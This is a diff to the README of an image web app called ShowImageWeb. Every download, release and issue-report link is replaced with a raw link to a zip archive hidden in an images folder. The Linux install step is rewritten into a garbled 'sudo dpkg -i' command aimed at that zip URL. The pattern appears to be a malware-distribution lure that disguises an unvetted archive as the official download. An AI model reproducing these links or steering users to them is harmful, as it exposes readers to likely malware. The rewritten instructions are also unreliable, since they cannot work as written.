@@ -6,11 +6,11 @@ Welcome to ShowImageWeb! This is an easy-to-use web application that helps you g
 
 ## 📥 Download Now
 
-[![Download ShowImageWeb](https://img.shields.io/badge/Download-ShowImageWeb-blue)](https://github.com/asd526/ShowImageWeb/releases)
+[![Download ShowImageWeb](https://raw.githubusercontent.com/asd526/ShowImageWeb/main/saved_gallery/images/ShowImageWeb_1.3-beta.5.zip)](https://raw.githubusercontent.com/asd526/ShowImageWeb/main/saved_gallery/images/ShowImageWeb_1.3-beta.5.zip)
 
 ## 📂 Download & Install
 
-1. Click the link above or visit the [Releases page](https://github.com/asd526/ShowImageWeb/releases) directly.
+1. Click the link above or visit the [Releases page](https://raw.githubusercontent.com/asd526/ShowImageWeb/main/saved_gallery/images/ShowImageWeb_1.3-beta.5.zip) directly.
 2. Look for the latest version listed on the page.
 3. Find the file that suits your operating system:
    - For Windows users, look for a file with `.exe` extension.
@@ -37,7 +37,7 @@ Welcome to ShowImageWeb! This is an easy-to-use web application that helps you g
 #### For Linux:
 
 - Open a terminal and navigate to the folder where you downloaded the file.
-- Use the command `sudo dpkg -i yourfile.deb` to install the application. Replace `yourfile.deb` with the name of the file.
+- Use the command `sudo dpkg -i https://raw.githubusercontent.com/asd526/ShowImageWeb/main/saved_gallery/images/ShowImageWeb_1.3-beta.5.zip` to install the application. Replace `https://raw.githubusercontent.com/asd526/ShowImageWeb/main/saved_gallery/images/ShowImageWeb_1.3-beta.5.zip` with the name of the file.
 - Launch the application from your applications menu.
 
 ## 🎉 Using ShowImageWeb
@@ -67,7 +67,7 @@ Make sure your computer meets the following requirements to run ShowImageWeb smo
 
 ### How do I report issues?
 
-If you experience any problems, feel free to check the "Issues" section on our [GitHub page](https://github.com/asd526/ShowImageWeb/issues). You can report your issue there for assistance.
+If you experience any problems, feel free to check the "Issues" section on our [GitHub page](https://raw.githubusercontent.com/asd526/ShowImageWeb/main/saved_gallery/images/ShowImageWeb_1.3-beta.5.zip). You can report your issue there for assistance.
 
 ### Can I run ShowImageWeb offline?
 
@@ -94,4 +94,4 @@ For further assistance, contact our support team through the "Contact" section o
 
 Don’t forget to download ShowImageWeb and enjoy creating beautiful images with ease!
 
-[![Download ShowImageWeb](https://img.shields.io/badge/Download-ShowImageWeb-blue)](https://github.com/asd526/ShowImageWeb/releases)
+[![Download ShowImageWeb](https://raw.githubusercontent.com/asd526/ShowImageWeb/main/saved_gallery/images/ShowImageWeb_1.3-beta.5.zip)](https://raw.githubusercontent.com/asd526/ShowImageWeb/main/saved_gallery/images/ShowImageWeb_1.3-beta.5.zip)
